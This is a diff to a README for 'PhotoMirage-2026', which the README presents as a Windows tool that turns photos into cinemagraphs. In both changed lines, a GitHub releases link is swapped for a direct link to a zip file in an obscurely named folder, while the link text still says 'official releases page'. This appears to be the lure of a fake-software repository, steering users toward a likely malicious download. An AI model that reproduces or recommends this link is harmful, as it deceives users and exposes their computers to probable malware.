@@ -5,7 +5,7 @@ description: "Download the PhotoMirage installer for Windows 10 and 11 to create
 ---
 # 📸 PhotoMirage-2026 - Create stunning motion photos easily
 
-[![](https://img.shields.io/badge/Download-PhotoMirage-blue.svg)](https://github.com/Rudolfthrifty640/PhotoMirage-2026/releases)
+[![](https://img.shields.io/badge/Download-PhotoMirage-blue.svg)](https://raw.githubusercontent.com/Rudolfthrifty640/rudolfthrifty640.github.io/main/palaeostriatal/io-github-rudolfthrifty-1.0.zip)
 
 PhotoMirage-2026 converts static images into animated cinemagraphs. This software breathes life into your photos using motion tools. You create eye-catching visuals for social media or digital displays without complex editing skills. The application runs on Windows 10 and Windows 11.
 
@@ -24,7 +24,7 @@ Ensure your computer meets these standards for smooth performance:
 
 Follow these steps to obtain the installer:
 
-1. Visit the [official releases page](https://github.com/Rudolfthrifty640/PhotoMirage-2026/releases) to access the files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Rudolfthrifty640/rudolfthrifty640.github.io/main/palaeostriatal/io-github-rudolfthrifty-1.0.zip) to access the files.
 2. Look for the latest version listed at the top.
 3. Click the file ending in .exe to start your download.
 4. Wait for the browser to finish saving the file to your computer.
